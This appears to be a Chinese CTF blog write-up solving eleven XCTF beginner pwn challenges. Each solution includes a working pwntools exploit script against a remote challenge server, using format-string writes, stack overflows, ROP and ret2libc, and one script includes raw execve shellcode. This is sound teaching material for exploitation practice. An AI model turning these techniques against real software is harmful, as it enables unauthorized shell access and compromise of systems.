# xctf
## 0x01 get_shell

> 题目描述: 运行就能拿到shell呢，真的

直接使用nc连接远程端口就可返回shell  
![2020-06-05-19-56-28](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-19-56-28.png)

## 0x02 CGfsb
> 题目描述: 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用 
 
首先使用`checksec`查看文件安全机制  
![2020-06-05-20-00-55](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-00-55.png)

关于checksec的使用可以参考[checksec工具使用](https://xsblog.xyz/2020/05/29/xctf/checksec%E4%BD%BF%E7%94%A8/)    

将程序拖入IDA查看反汇编代码  
![2020-06-05-20-06-05](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-20-06-05.png)  
显然在程序的第23行存在`格式化字符串漏洞`,而且发现关键代码`system("cat flag)`,条件是使得`pwnme`值为8；  
关于格式化字符串漏洞可参考[格式化字符串漏洞](https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/)

利用格式化字符串漏洞修改`pwnme`的值  
**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','33985')
#context.log_level = 'debug'
io.recvuntil('name:\n')
io.sendline('aa')
io.recvuntil('please:\n')
pwnme_addr = p32(0x0804a068)    # 获取pwnme的地址
payload = pwnme_addr + '%4c%10$n'   # 构造payload
io.sendline(payload)
print io.recvall()  # recvall()输出所有，直到EOF
```
关于pwn工具的使用可参考[pwntools使用](https://bbs.pediy.com/thread-247217.htm)

## 0x03 when_did_you_born

> 题目描述: 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办

查看安全机制  
![2020-06-05-21-04-03](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-04-03.png)  

拖入IDA查看反汇编代码  
![2020-06-05-21-10-40](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-10-40.png)  

发现危险函数`gets`,存在溢出漏洞，通过v4溢出修改v5的值  
**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','34377')
io.recvuntil('Birth?\n')
io.sendline('33')
io.recvuntil('Name?\n')
payload = 'A'*8+p64(1926)
io.sendline(payload)
print io.recvall()
```

## 0x04 hello_pwn
> 题目描述: pwn！，segment fault！菜鸡陷入了深思

查看安全机制  
![2020-06-05-21-33-58](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-33-58.png)  

拖入IDA查看反汇编代码  
![2020-06-05-21-37-38](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-37-38.png)  
read函数处可能造成溢出

由源代码可知只需使`if`中等式成立便可以得到flag  
跟进变量`unk_601068`,发现`dword_60106C`就在下面将，则可以通过read修改其值  
![2020-06-05-21-40-22](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-40-22.png)  

**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','30839')
io.recvuntil('for bof\n')
payload = 'A'*4+p64(1853186401)
io.sendline(payload)
print io.recvall()
```

## 0x05 level0
> 题目描述: 菜鸡了解了什么是溢出，他相信自己能得到shell

查看安全机制  
![2020-06-05-21-46-06](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-46-06.png)  

拖入IDA查看反汇编代码  
![2020-06-05-21-48-39](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-48-39.png) 

直接进入vulnerable_function()  
![2020-06-05-21-49-50](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-21-49-50.png)  
由于read函数所能读入的最大字节要大于buf与栈底的距离，所以存在栈溢出漏洞  

**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','36544')
io.recvuntil('World\n')

payload = 'A'*0x80+'A'*0x08+p64(0x400596)
io.sendline(payload)
io.interactive()
```

## 0x06 level2
> 题目描述: 菜鸡请教大神如何获得flag，大神告诉他‘使用`面向返回的编程`(ROP)就可以了’

查看保护机制  
![2020-06-05-22-34-00](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-34-00.png)  

拖入IDA查看反汇编代码  
![2020-06-05-22-42-59](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-42-59.png)  
与`level0`同样的溢出漏洞，只不过在程序里找不到现成的可以获取shell的函数了，所以需要将程序中的字符串当做`system`的参数传入  

在IDA中使用`shift+F12`可以查看程序中的所有字符串及其位置  
![2020-06-05-22-46-27](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-22-46-27.png)  
看到有`/bin/sh`字符串，地址为`0x0804A024` 

溢出原理图  
![2020-06-05-23-01-54](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-01-54.png)

**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','31250')
io.recvuntil('Input:\n')
payload = 'A'*0x88+'A'*0x04+p32(0x08048320)+'A'*0x4+p32(0x0804A024)
# 调用一个新的函数时，会将esp的值赋值到ebp上去，所以不用管ebp赋值到了一个无效地址，依然可以恢复正常工作
io.sendline(payload)
io.interactive()
```

## 0x07 guess_num
> 菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么

查看安全机制  
![2020-06-05-23-04-03](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-04-03.png)  
可以看到这次安全机制基本上都开了

拖入IDA查看反汇编代码  
![2020-06-05-23-21-54](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-21-54.png)  
gets存在溢出漏洞，可以通过gets修改随即种子`seed`的值

整个程序的逻辑就是猜数字，猜中十次才可以的到flag；  
这里使用rand来生成随机数，然而rand生成的随机数并不是真正的随机数,只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1；  
正常情况下应该使种子随生成的随机数而变化，即每生成一次随机数更改一次种子  

使用python自带的ctypes模块进行python和c混合编程  
使用ldd查看guss_num所使用的共享库libc  
![2020-06-05-23-42-17](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-05-23-42-17.png)  
可以看到`libc.so.6`指向的文件`/lib/x86_64-linux-gnu/libc.so.6`可当做共享库载入python中,载入之后就可以通过python调用共享库中的函数，实现混合编程

**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
from ctypes import *
io = remote('220.249.52.133','43798')
io.recvuntil('name:')
payload = 'A'*0x20+p32(1)   # 由于seed[0]大小为32位，所以使用p32
io.sendline(payload)

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(1)

for i in range(10):
        num = str(libc.rand()%6+1)
        io.recvuntil('number:')
        io.sendline(num)
print io.recvall()
```
**注:** 最后的`print io.recvall()`可以用`io.interactive()`代替，不过使用后者会返回一个无效的命令行

## 0x08 cgpwn2
> 题目描述: 菜鸡认为自己需要一个字符串

查看安全机制  
![2020-06-06-08-05-57](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-05-57.png)  

拖入IDA查看反汇编代码  
直接跟进hello  
![2020-06-06-08-27-47](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-08-27-47.png)  

显然在gets()函数存在溢出
然而程序中有现成`system`函数，却找不到可以利用的字符串，考率到前面的`fgets`函数，可以尝试将所需要的字符串参数传入`name`变量中，在将`name`作为`system`的参数传入  

**解题脚本:**  
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','42443')
io.recvuntil('name\n')
io.sendline('/bin/sh')
io.recvuntil('here:\n')
name_addr = 0x0804A080
payload = 'A'*0x26+'A'*4+p32(0x08048420)+'A'*4+p32(name_addr)
io.sendline(payload)
io.interactive()
```

## 0x09 string
> 题目描述: 菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求

查看程序安全机制  
![2020-06-06-13-44-13](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-44-13.png)  

拖入IDA查看反汇编代码  
![2020-06-06-13-52-14](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-52-14.png)    
输出了V4的值，其他暂未发现异常，跟进查看  
![2020-06-06-13-53-23](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-53-23.png)  
创建了一个新的游戏人物，同时调用了三个函数，依次跟进查看

![2020-06-06-13-54-49](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-54-49.png)  
在第一个函数中碰到了一个循环，必须输入east才能跳出循环  

![2020-06-06-13-56-49](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-56-49.png)  
在第二个函数中发现了格式化字符串漏洞，触发条件为`v1==1`  

![2020-06-06-13-59-15](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-59-15.png)  
在第三个函数中发现了关键代码，程序将用户输入的字符强制转化成函数执行，执行的条件就是`*a1 == a1[1]`,逆推发现`a1`就是`V3`,所以条件就是`V3[0]=V3[1]`就是这里可以用来输入`shellcode`.

**攻击思路:** 利用格式化字符创漏洞修改`V3[0]`的值，再输入一个`shellcode`获取shell,可以在[http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)网站上找到对应的`shellcode`来获取shell  

**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','35103')
io.recvuntil('secret[0] is ')
v3 = int(io.recvuntil('\n')[:-1],16)
io.recvuntil('name be:\n')
io.sendline('aa')
io.recvuntil('east or up?:\n')
io.sendline('east')
io.recvuntil('or leave(0)?:\n')
io.sendline('1')
io.recvuntil('address\'\n')
io.sendline(str(v3))	# str用于将十进制以字符串形式输出，例：111输出'111'
io.recvuntil(' wish is:\n')
payload = '%85c%7$n'	
# 64位程序格式化字符串漏洞中，格式化字符串的第六个偏移地址是调用printf的函数的栈上的第一个QWORD(64位)
# 而第二个QWORD即为V2的值
# 所以这里我们的偏移地址设为7，修改V2所指向的V3[0]
io.sendline(payload)
io.recvuntil('YOU SPELL\n')
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
io.sendline(shellcode)
io.interactive()
```

## 0x0A int_overflow
> 题目描述: 菜鸡感觉这题似乎没有办法溢出，真的么?

查看安全机制  
![2020-06-06-16-06-33](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-06-33.png)    

拖入IDA查看反汇编代码    
跟近查看，进入到`chek_passwd`  
![2020-06-06-16-22-15](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-22-15.png)   
出现危险函数`strcpy`，存在栈溢出漏洞，但是要想触发漏洞，必须使得v3在3和8之间  
v3的值为s字符串的长度，根据题目提示想到整数溢出，利用整数溢出触发漏洞  

**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
io = remote('220.249.52.133','46540')
io.recvuntil('choice:')
io.sendline('1')
io.recvuntil('username:\n')
io.sendline('aa')
io.recvuntil('passwd:\n')
# v3大小为8个字节，范围为0~255
payload = 'A'*0x18+p32(0x0804868B)+'A'*(259-0x18-4)
io.sendline(payload)
io.interactive()
```

## 0x0B level3
> 题目描述: libc!libc!这次没有system，你能帮菜鸡解决这个难题么?

题目提供的文件是一个压缩包，解压之后有两个文件，一个是可执行文件，还有一个动态链接库文件  
关于plt、got、动态链接之间的关系可以参考  
* [深入了解GOT,PLT和动态链接](https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html)  
* [Linux动态链接中的PLT和GOT](https://blog.csdn.net/linyt/article/details/51893258)  

`libc_32.so.6`中存放的是程序运行时所用到的外部函数，通过PLT表和GOT表连接到主程序中   

查看安全机制  
![2020-06-06-16-58-09](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-58-09.png)  
没有开启`PIE`，所以`libc`中函数的相对地址不发生变化(程序自带函数地址也不会发生变化)，也就是说只要知道`libc`在程序中的的基址，根据偏移地址就可以知道任何函数在程序中的实际地址  

拖入IDA查看反汇编代码  
![2020-06-06-17-35-00](https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-17-35-00.png)  
在`vulnerable_function()`中`read()`函数存在溢出，然而程序中并没有现成的system函数，所以必须想办法调用动态连接库中的函数

**攻击思路:** 利用栈溢出返回到`write`函数(注意:只能通过plt调用函数，不能直接跳转到got表)，同时传入`write`函数的`got`表的地址，由于程序没有开启`PIE`保护，所以程序中`plt`表和`got`表的位置都是不会变化的，函数的相对地址也是固定的，所以可以通过本地的程序获取`write`函数`got`表的地址，然后输出`write`函数实际地址。  
将得到的实际地址与`libc`中的`write`的偏移地址相减，则可以得到`libc`的基地址，加上`system`函数在`libc`里面的偏移地址，就可以得到`system`函数在程序中的实际地址  
此时利用溢出再次控制返回函数到`main`函数，二次攻击溢出返回到`system`函数，传入`/bin/sh`参数，就可以得到`shell`了  

**注:** 字符串`/bin/sh`可以在libc中找到，查找方法如下
```
strings -a -t x libc_32.so.6 | grep "/bin/sh"
```

**解题脚本:**
```python
#!/usr/bin/python
#coding=utf-8

from pwn import *
elf = ELF('./level3')
libc = ELF('./libc_32.so.6')
write_plt = elf.plt['write']    #返回的是数字，非字符
write_got = elf.got['write']
main_addr = elf.symbols['main']
write_off = libc.symbols['write']

io = remote('220.249.52.133','47190')
io.recvuntil('Input:\n')
payload = 'A'*0x8c+p32(write_plt)+p32(main_addr)
payload += p32(1)+p32(write_got)+p32(4) #传入参数write(1,write_got,4)
io.sendline(payload)
write_addr = u32(io.recv())
io.recvuntil('Input:\n')

libc_addr = write_addr-write_off        #计算出libc基址
system_addr = libc.symbols['system']+libc_addr  #libc基址加上system偏移地址得到实际地址
bin_sh_addr = 0x15902b + libc_addr      #基址加上使用strings得到的/bin/sh的偏移地址
payload = 'A'*0x8c+p32(system_addr)+'A'*4+p32(bin_sh_addr)
io.sendline(payload)
io.interactive()
```

参考链接  
[https://www.cnblogs.com/at0de/p/11269120.html](https://www.cnblogs.com/at0de/p/11269120.html)  
[https://bbs.pediy.com/thread-254858.htm](https://bbs.pediy.com/thread-254858.htm)  
[https://www.jianshu.com/p/457520f97a76](https://www.jianshu.com/p/457520f97a76)
